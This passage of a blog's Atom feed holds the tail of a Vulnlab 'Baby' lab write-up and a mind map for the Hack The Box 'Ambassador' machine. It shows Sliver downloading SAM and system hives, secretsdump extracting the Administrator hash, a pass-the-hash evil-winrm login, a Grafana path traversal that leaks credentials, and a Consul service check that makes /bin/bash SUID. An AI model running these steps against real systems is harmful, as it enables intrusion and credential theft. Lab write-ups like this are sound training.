+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Wrote 16842752 bytes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 file successfully, 0 files unsuccessfully&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to /home/syl/vulnlab/Baby/system
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;server] sliver &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EXISTING_CROTCH&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; download SAM
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Wrote 16842752 bytes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 file successfully, 0 files unsuccessfully&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to /home/syl/vulnlab/Baby/SAM
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we can extract the hashes with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;impacket-secretsdump&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sylsec&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 secretsdump.py &lt;span class=&quot;nt&quot;&gt;-system&lt;/span&gt; /home/syl/vulnlab/Baby/exfiltrated/system &lt;span class=&quot;nt&quot;&gt;-sam&lt;/span&gt; /home/syl/vulnlab/Baby/exfiltrated/SAM &lt;span class=&quot;nt&quot;&gt;-ntds&lt;/span&gt; /home/syl/vulnlab/Baby/exfiltrated/ntds.dit LOCAL
+...
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:&amp;lt;HASH&amp;gt;:::
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And once we’ve extracted the hash, we can log in to the DC using WinRM.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sylsec&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; Administrator &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$hash&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ..&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;root.txt
+VL&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">Recently I’ve started to explore more platforms for hacking different type of boxes and I found that xct has created vulnlab. From what I’ve explored, I have to say that I am really impressed with it and so far, I really like it. Here is my writeup for the “Baby” lab.</summary></entry><entry><title type="html">Hack The Box - Ambassador [Medium]</title><link href="http://localhost:4000/ctf-writeup/2023/08/21/htb-ambassador.html" rel="alternate" type="text/html" title="Hack The Box - Ambassador [Medium]" /><published>2023-08-21T00:00:00+03:00</published><updated>2023-08-21T00:00:00+03:00</updated><id>http://localhost:4000/ctf-writeup/2023/08/21/htb-ambassador</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/08/21/htb-ambassador.html">&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;UTF-8&quot; /&gt;
+&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;
+&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot; /&gt;
+&lt;title&gt;Markmap&lt;/title&gt;
+&lt;style&gt;
+* {
+  margin: 0;
+  padding: 0;
+}
+#mindmap {
+  display: block;
+  width: 100vw;
+  height: 100vh;
+}
+&lt;/style&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets@11.8.0/styles/default.min.css&quot; /&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/markmap-toolbar@0.15.3/dist/style.css&quot; /&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;svg id=&quot;mindmap&quot;&gt;&lt;/svg&gt;
+&lt;script src=&quot;https://cdn.jsdelivr.net/npm/d3@7.8.5/dist/d3.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/markmap-view@0.15.3/dist/browser/index.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/markmap-toolbar@0.15.3/dist/index.js&quot;&gt;&lt;/script&gt;&lt;script&gt;(r =&gt; {
+                setTimeout(r);
+              })(() =&gt; {
+  const {
+    markmap,
+    mm
+  } = window;
+  const {
+    el
+  } = markmap.Toolbar.create(mm);
+  el.setAttribute(&apos;style&apos;, &apos;position:absolute;bottom:20px;right:20px&apos;);
+  document.body.append(el);
+})&lt;/script&gt;&lt;script&gt;((getMarkmap, getOptions, root, jsonOptions) =&gt; {
+          const markmap = getMarkmap();
+          window.mm = markmap.Markmap.create(&apos;svg#mindmap&apos;, (getOptions || markmap.deriveOptions)(jsonOptions), root);
+        })(() =&gt; window.markmap,null,{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:0,&quot;payload&quot;:{&quot;lines&quot;:[0,1]},&quot;content&quot;:&quot;Ambassador&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:1,&quot;payload&quot;:{&quot;lines&quot;:[2,3]},&quot;content&quot;:&quot;PORTS&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[4,5]},&quot;content&quot;:&quot;TCP&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[6,7]},&quot;content&quot;:&quot;Discovered open port 3306/tcp on 10.10.11.183&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[7,8]},&quot;content&quot;:&quot;MySQL 8.0.30-0ubuntu0.20.04.2&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[8,9]},&quot;content&quot;:&quot;Discovered open port 80/tcp on 10.10.11.183&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[9,10]},&quot;content&quot;:&quot;Hugo 0.94.2&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[10,11]},&quot;content&quot;:&quot;http-title: Ambassador Development Server&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[11,12]},&quot;content&quot;:&quot;Discovered open port 22/tcp on 10.10.11.183&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[12,13]},&quot;content&quot;:&quot;OpenSSH 8.2p1 Ubuntu 4ubuntu0.5&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[13,14]},&quot;content&quot;:&quot;Discovered open port 3000/tcp on 10.10.11.183&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[14,15]},&quot;content&quot;:&quot;HTTP/1.0 302 Found&quot;,&quot;children&quot;:[]}]}]},{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[16,17]},&quot;content&quot;:&quot;UDP&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[18,19]},&quot;content&quot;:&quot;None&quot;,&quot;children&quot;:[]}]}]},{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:1,&quot;payload&quot;:{&quot;lines&quot;:[20,21]},&quot;content&quot;:&quot;HTTP 10.10.11.183:80&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[24,25]},&quot;content&quot;:&quot;Content&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[28,29]},&quot;content&quot;:&quot;user: &lt;code&gt;developer&lt;/code&gt;&quot;,&quot;children&quot;:[]}]}]},{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:1,&quot;payload&quot;:{&quot;lines&quot;:[31,32]},&quot;content&quot;:&quot;HTTP 10.10.11.183:3000&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[35,36]},&quot;content&quot;:&quot;Content&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[37,38]},&quot;content&quot;:&quot;Unauthorized&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[38,39]},&quot;content&quot;:&quot;Grafana[8.2.0]&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[40,41]},&quot;content&quot;:&quot;Authorized&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[42,43]},&quot;content&quot;:&quot;Data Source - &lt;code&gt;mysql.yml&lt;/code&gt;&quot;,&quot;children&quot;:[]}]}]},{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[44,45]},&quot;content&quot;:&quot;Login&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[46,47]},&quot;content&quot;:&quot;&lt;code&gt;admin:messageInABottle685427&lt;/code&gt;&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[48,49]},&quot;content&quot;:&quot;CVEs&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[50,51]},&quot;content&quot;:&quot;CVE-2021-43798 *&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;fence&quot;,&quot;depth&quot;:4,&quot;content&quot;:&quot;&lt;pre&gt;&lt;code&gt;&lt;span class=\&quot;hljs-symbol\&quot;&gt;developer:&lt;/span&gt;&lt;span class=\&quot;hljs-symbol\&quot;&gt;x:&lt;/span&gt;&lt;span class=\&quot;hljs-number\&quot;&gt;1000&lt;/span&gt;&lt;span class=\&quot;hljs-symbol\&quot;&gt;:&lt;/span&gt;&lt;span class=\&quot;hljs-number\&quot;&gt;1000&lt;/span&gt;&lt;span class=\&quot;hljs-symbol\&quot;&gt;:developer&lt;/span&gt;&lt;span class=\&quot;hljs-symbol\&quot;&gt;:/home/developer&lt;/span&gt;&lt;span class=\&quot;hljs-symbol\&quot;&gt;:/bin/bash&lt;/span&gt;\n&lt;/code&gt;&lt;/pre&gt;\n&quot;,&quot;children&quot;:[],&quot;payload&quot;:{&quot;lines&quot;:[52,55]}},{&quot;type&quot;:&quot;bullet_list&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[56,63]},&quot;content&quot;:&quot;&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:5,&quot;payload&quot;:{&quot;lines&quot;:[56,57]},&quot;content&quot;:&quot;&lt;code&gt;/var/lib/grafana/grafana.db&lt;/code&gt;&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:5,&quot;payload&quot;:{&quot;lines&quot;:[57,58]},&quot;content&quot;:&quot;&lt;code&gt;/etc/mysql/mysql.conf.d/mysqld.cnf&lt;/code&gt;&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:5,&quot;payload&quot;:{&quot;lines&quot;:[58,59]},&quot;content&quot;:&quot;&lt;code&gt;/etc/grafana/grafana.ini&lt;/code&gt;&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:6,&quot;payload&quot;:{&quot;lines&quot;:[59,60]},&quot;content&quot;:&quot;&lt;code&gt;admin_password = messageInABottle685427&lt;/code&gt;&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:5,&quot;payload&quot;:{&quot;lines&quot;:[60,61]},&quot;content&quot;:&quot;&lt;code&gt;/etc/grafana/provisioning/datasources/mysql.yml&lt;/code&gt;&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:6,&quot;payload&quot;:{&quot;lines&quot;:[61,62]},&quot;content&quot;:&quot;&lt;code&gt;grafana:dontStandSoCloseToMe63221!&lt;/code&gt;&quot;,&quot;children&quot;:[]}]}]}]}]}]},{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:1,&quot;payload&quot;:{&quot;lines&quot;:[63,64]},&quot;content&quot;:&quot;DB 3306&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[67,68]},&quot;content&quot;:&quot;&lt;code&gt;use whackywidget; -&amp;gt; select * from users; -&amp;gt; developer:YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==&lt;/code&gt;&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[68,69]},&quot;content&quot;:&quot;&lt;code&gt;anEnglishManInNewYork027468&lt;/code&gt;&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[69,70]},&quot;content&quot;:&quot;userFlag&quot;,&quot;children&quot;:[]}]}]}]},{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:1,&quot;payload&quot;:{&quot;lines&quot;:[71,72]},&quot;content&quot;:&quot;SSH 22&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[75,76],&quot;index&quot;:1},&quot;content&quot;:&quot;1. Files on the System&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[76,77]},&quot;content&quot;:&quot;&lt;code&gt;/home/developer/.gitconfig&lt;/code&gt;&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[77,78]},&quot;content&quot;:&quot;&lt;code&gt;/opt/my-app/&lt;/code&gt;&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[78,79]},&quot;content&quot;:&quot;&lt;code&gt;/opt/my-app/put-config-in-consul.sh&lt;/code&gt;&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:5,&quot;payload&quot;:{&quot;lines&quot;:[79,80]},&quot;content&quot;:&quot;&lt;code&gt;consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD&lt;/code&gt;&quot;,&quot;children&quot;:[]}]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[80,81]},&quot;content&quot;:&quot;&lt;code&gt;/home/developer/.profile&lt;/code&gt;&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[81,82]},&quot;content&quot;:&quot;&lt;code&gt;/home/developer/.bash_history&lt;/code&gt;&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[82,83]},&quot;content&quot;:&quot;&lt;code&gt;/root/&lt;/code&gt; ?&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[83,84]},&quot;content&quot;:&quot;&lt;code&gt;consul&lt;/code&gt; *&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[84,85]},&quot;content&quot;:&quot;&lt;code&gt;/opt/consul/raft/raft.db&lt;/code&gt;&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[85,86]},&quot;content&quot;:&quot;&lt;code&gt;/development-machine-documentation/*&lt;/code&gt;&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[86,87]},&quot;content&quot;:&quot;&lt;code&gt;/development-machine-documentation/deploy.sh&lt;/code&gt;&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[87,88]},&quot;content&quot;:&quot;&lt;code&gt;/opt/my-app/whackywidget/put-config-in-consul.sh&lt;/code&gt;&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[88,89],&quot;index&quot;:2},&quot;content&quot;:&quot;2. Installed Applications&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[89,90]},&quot;content&quot;:&quot;consul&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[90,91],&quot;index&quot;:3},&quot;content&quot;:&quot;3. Network&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[91,92]},&quot;content&quot;:&quot;tcp 127.0.0.1:8300&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[92,93]},&quot;content&quot;:&quot;tcp 127.0.0.1:8301&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[93,94]},&quot;content&quot;:&quot;empty reply for HTTP&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[94,95]},&quot;content&quot;:&quot;tcp 127.0.0.1:8302&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[95,96]},&quot;content&quot;:&quot;empty reply for HTTP&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[96,97]},&quot;content&quot;:&quot;tcp 127.0.0.1:8500&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[97,98]},&quot;content&quot;:&quot;Consul UI&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:4,&quot;payload&quot;:{&quot;lines&quot;:[98,99]},&quot;content&quot;:&quot;Content: &lt;code&gt;Consul Agent: UI disabled. To enable, set ui_config.enabled=true in the agent configuration and restart&lt;/code&gt;&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[99,100]},&quot;content&quot;:&quot;tcp 127.0.0.1:8600&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[100,101]},&quot;content&quot;:&quot;tcp 127.0.0.1:3306&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[101,102],&quot;index&quot;:4},&quot;content&quot;:&quot;4. Running Processes&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[102,103]},&quot;content&quot;:&quot;&lt;code&gt;/usr/bin/consul agent -config-dir=/etc/consul.d/config.d -config-file=/etc/consul.d/consul.hcl&lt;/code&gt;&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[103,104],&quot;index&quot;:5},&quot;content&quot;:&quot;5. Scheduled Jobs/Tasks&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[104,105]},&quot;content&quot;:&quot;&lt;code&gt;find /etc/consul.d/config.d/* -mmin +10 -delete&lt;/code&gt;&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[105,106],&quot;index&quot;:6},&quot;content&quot;:&quot;6. System&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[106,107]},&quot;content&quot;:&quot;Sudo version 1.8.31&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[107,108]},&quot;content&quot;:&quot;PermitRootLogin yes&quot;,&quot;children&quot;:[]}]}]},{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:1,&quot;payload&quot;:{&quot;lines&quot;:[109,110]},&quot;content&quot;:&quot;Consul Research&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[111,112]},&quot;content&quot;:&quot;https://www.hashicorp.com/blog/protecting-consul-from-rce-risk-in-specific-configurations&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[112,113]},&quot;content&quot;:&quot;https://developer.hashicorp.com/consul/docs/services/usage/checks&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[113,114]},&quot;content&quot;:&quot;https://developer.hashicorp.com/consul/commands/exec&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;heading&quot;,&quot;depth&quot;:1,&quot;payload&quot;:{&quot;lines&quot;:[115,116]},&quot;content&quot;:&quot;Root&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[116,117]},&quot;content&quot;:&quot;&lt;code&gt;export CONSUL_HTTP_TOKEN=bb03b43b-1d81-d62b-24b5-39540ee469b5&lt;/code&gt;&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[117,118]},&quot;content&quot;:&quot;&lt;code&gt;consul catalog nodes&lt;/code&gt;&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[118,119]},&quot;content&quot;:&quot;&lt;code&gt;ambassador 27361fb5-583a-5db0-27bf-ecfed7b4b669 127.0.0.1 dc1 lan=127.0.0.1, lan_ipv4=127.0.0.1, wan=127.0.0.1, wan_ipv4=127.0.0.1 consul-network-segment=&lt;/code&gt;&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[119,120]},&quot;content&quot;:&quot;&lt;code&gt;find / -type d -writable 2&amp;gt;/dev/null&lt;/code&gt;&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[120,121]},&quot;content&quot;:&quot;&lt;code&gt;/etc/consul.d/config.d&lt;/code&gt;&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[121,122]},&quot;content&quot;:&quot;&lt;code&gt;touch /etc/consul.d/config.d/syl.hcl&lt;/code&gt;&quot;,&quot;children&quot;:[{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:3,&quot;payload&quot;:{&quot;lines&quot;:[122,137]},&quot;content&quot;:&quot;&lt;pre&gt;&lt;code class=\&quot;language-hcl\&quot;&gt;service {\n    name = &amp;quot;dummy-service&amp;quot;\n    id   = &amp;quot;dummy-service-1&amp;quot;\n    port = 8080\n\n    check = {\n        id = &amp;quot;mem-util&amp;quot;\n        name = &amp;quot;Memory utilization&amp;quot;\n        args = [&amp;quot;chmod&amp;quot;, &amp;quot;u+s&amp;quot;, &amp;quot;/bin/bash&amp;quot;]\n        interval = &amp;quot;10s&amp;quot;\n        timeout = &amp;quot;1s&amp;quot;\n    }\n}\n&lt;/code&gt;&lt;/pre&gt;\n&quot;,&quot;children&quot;:[]}]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[137,138]},&quot;content&quot;:&quot;&lt;code&gt;consul reload&lt;/code&gt;&quot;,&quot;children&quot;:[]},{&quot;type&quot;:&quot;list_item&quot;,&quot;depth&quot;:2,&quot;payload&quot;:{&quot;lines&quot;:[138,139]},&quot;content&quot;:&quot;&lt;code&gt;/bin/bash -p&lt;/code&gt;&quot;,&quot;children&quot;:[]}]}]},{})&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">Markmap</summary></entry><entry><title type="html">Hack The Box - Irked [Easy]</title><link href="http://localhost:4000/ctf-writeup/2023/08/06/htb-irked.html" rel="alternate" type="text/html" title="Hack The Box - Irked [Easy]" /><published>2023-08-06T00:00:00+03:00</published><updated>2023-08-06T00:00:00+03:00</updated><id>http://localhost:4000/ctf-writeup/2023/08/06/htb-irked</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/08/06/htb-irked.html">&lt;p&gt;Here is a quick xmind map.&lt;/p&gt;
+
